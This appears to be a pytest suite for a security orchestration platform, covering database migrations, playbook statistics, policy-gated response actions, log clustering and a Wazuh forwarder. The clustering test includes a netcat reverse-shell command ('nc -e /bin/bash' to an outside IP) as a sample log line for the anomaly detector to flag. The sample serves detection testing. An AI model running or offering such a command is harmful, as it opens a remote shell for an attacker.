"""Platform pieces: migrations, optimizer, log clustering, response endpoints, Wazuh forwarder."""
import json
import subprocess
import sys
import threading
from http.server import BaseHTTPRequestHandler, HTTPServer
from pathlib import Path

from alembic import command
from alembic.autogenerate import compare_metadata
from alembic.config import Config
from alembic.migration import MigrationContext
from sqlalchemy import create_engine

from ai.clustering.log_clusterer import cluster_recent_events, cluster_texts, to_template
from ai.optimizer.playbook_optimizer import MIN_SAMPLES, playbook_report
from soar.config import ROOT
from soar.models import Base
from soar.pipeline.ingest import ingest
from soar.simulate import brute_force, malware

KEY = {"X-API-Key": "test-ingest-key"}


# ─────────── migrations ───────────
def _alembic(tmp_path, name):
    cfg = Config(str(ROOT / "alembic.ini"))
    cfg.set_main_option("script_location", str(ROOT / "migrations"))
    return cfg, create_engine(f"sqlite:///{tmp_path / name}")


def test_migrations_build_exactly_the_schema_the_models_declare(tmp_path):
    cfg, engine = _alembic(tmp_path, "mig.db")
    with engine.begin() as conn:
        cfg.attributes["connection"] = conn
        command.upgrade(cfg, "head")
    with engine.connect() as conn:
        diff = compare_metadata(MigrationContext.configure(conn), Base.metadata)
    assert diff == [], f"models and migrations have drifted: {diff}"


def test_migration_can_be_downgraded_and_reapplied(tmp_path):
    cfg, engine = _alembic(tmp_path, "mig2.db")
    with engine.begin() as conn:
        cfg.attributes["connection"] = conn
        command.upgrade(cfg, "head")
        command.downgrade(cfg, "base")
        command.upgrade(cfg, "head")


# ─────────── optimizer ───────────
def test_optimizer_reports_only_stored_data_and_says_when_it_is_insufficient(client, db):
    empty = playbook_report(db)
    assert empty["totals"] == {"executions": 0, "steps": 0, "approvals": 0} and empty["enough_data"] is False
    assert "Not enough executions" in empty["recommendations"][0]
    from soar.playbooks.library import load_library
    load_library(db)
    db.commit()
    for src, p in brute_force():
        ingest(db, src, p)
    db.commit()
    r = playbook_report(db)
    assert r["playbooks"]["ssh_brute_force_response"]["executions"] == 1
    assert r["actions"]["enrich_ioc"]["succeeded"] == 1 and r["approvals"]["pending"] == 1
    assert MIN_SAMPLES == 10 and r["enough_data"] is False


def test_playbook_endpoints_expose_definitions_and_actions(client, admin):
    pb = client.get("/api/playbooks", headers=admin).json()
    names = {p["name"] for p in pb["playbooks"]}
    assert {"ssh_brute_force_response", "phishing_response", "suspicious_process_response"} <= names
    actions = {a["name"]: a for a in pb["actions"]}
    assert actions["isolate_host"]["risk"] == "high" and actions["block_ip"]["reversible"] is True
    assert client.get("/api/playbooks/stats", headers=admin).json()["totals"]["executions"] == 0


def test_manual_playbook_run_and_blocklist_feed_auth(client, login):
    analyst = login("pb1", "SOC_ANALYST")
    for src, p in malware():
        client.post("/api/events", json={"source": src, "payload": p}, headers=KEY)
    inc = client.get("/api/incidents", headers=analyst).json()["incidents"][0]["number"]
    # brute-force playbook does not apply to a reverse-shell incident (needs an external source IP)
    r = client.post(f"/api/incidents/{inc}/playbooks/ssh_brute_force_response/run", headers=analyst)
    assert r.status_code == 409 and "does not apply" in r.text
    assert client.post(f"/api/incidents/{inc}/playbooks/nope/run", headers=analyst).status_code == 409
    # blocklist feed needs a session or the API key
    assert client.get("/api/blocklist.txt").status_code == 401
    assert client.get("/api/blocklist.txt", headers={"X-API-Key": "bad"}).status_code == 401
    assert client.get("/api/blocklist.txt", headers=KEY).status_code == 200


def test_analyst_can_run_recommended_actions_through_policy(client, login):
    analyst = login("pb2", "SOC_ANALYST")
    for src, p in brute_force():
        client.post("/api/events", json={"source": src, "payload": p}, headers=KEY)
    inc = client.get("/api/incidents", headers=analyst).json()["incidents"][0]["number"]
    body = {"actions": [{"action": "block_ip", "target": "10.0.0.5"}, {"action": "notify_analyst"}]}
    ex = client.post(f"/api/incidents/{inc}/actions/run", json=body, headers=analyst).json()
    detail = client.get(f"/api/executions/{ex['execution_id']}", headers=analyst).json()
    by = {s["action"]: s for s in detail["steps"]}
    assert by["block_ip"]["status"] == "skipped" and "denied by policy" in by["block_ip"]["result"]["detail"]
    assert by["notify_analyst"]["status"] == "succeeded"
    assert client.post(f"/api/incidents/{inc}/actions/run", json={"actions": []}, headers=analyst).status_code == 422


# ─────────── log clustering ───────────
def test_templates_collapse_variable_parts():
    a = to_template("Failed password for root from 192.168.1.50 port 22")
    b = to_template("Failed password for admin from 10.0.0.9 port 2201")
    assert a == b and "<ip>" in a and "<user>" in a


def test_clustering_groups_similar_logs_and_flags_unusual_ones():
    texts = ([f"Failed password for user{i} from 10.0.0.{i} port 22" for i in range(1, 30)]
             + [f"File /var/log/app{i}.log rotated" for i in range(1, 25)]
             + ["Suspicious process: nc -e /bin/bash 1.2.3.4 4444"])
    sev = [2] * 29 + [1] * 24 + [4]
    res = cluster_texts(texts, sev)
    assert res["status"] == "ok" and res["k"] >= 2 and res["silhouette"] > 0.3
    unusual = [c for c in res["clusters"] if c["unusual"]]
    assert any("nc -e" in c["sample"] for c in unusual) and res["clusters"][0]["unusual"]
    assert sum(c["size"] for c in res["clusters"]) == len(texts)


def test_clustering_handles_too_few_events():
    assert cluster_texts(["a", "b"])["status"] == "too_few_events"


def test_cluster_recent_events_links_clusters_to_incidents(client, admin, db):
    for src, p in brute_force():
        ingest(db, src, p)
    db.commit()
    res = cluster_recent_events(db)
    assert res["status"] == "ok" and any(c["incidents"] for c in res["clusters"])
    api = client.get("/api/ai/clusters", headers=admin)
    assert api.status_code == 200 and api.json()["n_events"] == 9


# ─────────── Wazuh forwarder (real HTTP round trip on loopback) ───────────
class _Sink(BaseHTTPRequestHandler):
    received: list = []

    def do_POST(self):  # noqa: N802
        body = self.rfile.read(int(self.headers["Content-Length"]))
        _Sink.received.append((self.path, self.headers.get("X-API-Key"), json.loads(body)))
        payload = json.dumps({"results": [{"incident_number": "INC-TEST-0001"}]}).encode()
        self.send_response(200)
        self.send_header("Content-Length", str(len(payload)))
        self.end_headers()
        self.wfile.write(payload)

    def log_message(self, *a):
        pass


def test_wazuh_forwarder_posts_alert_with_api_key(tmp_path):
    script = Path(ROOT / "integrations" / "custom-soar").read_text(encoding="utf-8")
    patched = tmp_path / "custom_soar.py"
    patched.write_text(script.replace('"/var/ossec/logs/integrations.log"', repr(str(tmp_path / "int.log"))), encoding="utf-8")
    alert = tmp_path / "alert.json"
    alert.write_text(json.dumps({"rule": {"id": "100001", "level": 10}}))
    _Sink.received = []
    server = HTTPServer(("127.0.0.1", 0), _Sink)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        ok = subprocess.run([sys.executable, str(patched), str(alert), "k123", f"http://127.0.0.1:{server.server_port}"],
                            capture_output=True, timeout=30)
        missing_key = subprocess.run([sys.executable, str(patched), str(alert), "", "http://127.0.0.1:1"],
                                     capture_output=True, timeout=30)
        unreachable = subprocess.run([sys.executable, str(patched), str(alert), "k", "http://127.0.0.1:1"],
                                     capture_output=True, timeout=30)
    finally:
        server.shutdown()
    assert ok.returncode == 0 and _Sink.received[0][0] == "/api/events" and _Sink.received[0][1] == "k123"
    assert _Sink.received[0][2] == {"source": "wazuh", "payload": {"rule": {"id": "100001", "level": 10}}}
    assert missing_key.returncode == 1 and unreachable.returncode == 1
    assert "INC-TEST-0001" in (tmp_path / "int.log").read_text()
